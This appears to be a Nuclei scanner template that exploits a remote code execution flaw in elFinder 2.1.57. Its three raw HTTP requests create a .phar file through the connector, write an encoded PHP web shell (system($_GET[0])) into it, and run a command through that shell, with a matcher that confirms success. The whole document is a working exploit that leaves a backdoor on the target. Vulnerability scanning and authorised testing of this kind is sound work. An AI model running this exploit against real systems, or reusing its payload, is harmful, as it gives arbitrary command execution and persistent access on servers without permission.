id: elfinder-rce

info:
  name: elFinder 2.1.57 - Remote Code Execution
  author: 0xnemian
  severity: critical
  description: |
    Exploits a vulnerability in elFinder 2.1.57 to execute arbitrary code via .phar files.
    This template uploads a .phar file, injects a PHP payload, and executes it.
  reference:
    - https://github.com/Studio-42/elFinder
  tags: elfinder, rce, phar

variables:
  fname: "{{rand_text_alpha(6)}}"
  marker: "{{rand_text_alpha(8)}}"

requests:
  - raw:
      - |
        GET /elfinder/php/connector.php?cmd=mkfile&target=l1_Lw&name={{fname}}.phar HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /elfinder/php/connector.php?cmd=put&target={{file_hash}}&content=%3C%3F%3D%27%27%3Bsystem%28%24_GET%5B0%5D%29%3B%3F%3E HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /elfinder/files/{{fname}}.phar?0=echo%20{{marker}} HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: file_hash
        part: body
        internal: true
        group: 1
        regex:
          - '"hash"\s*:\s*"(l1_[A-Za-z0-9_.-]+)"'

    matchers:
      - type: word
        part: body
        words:
          - "{{marker}}"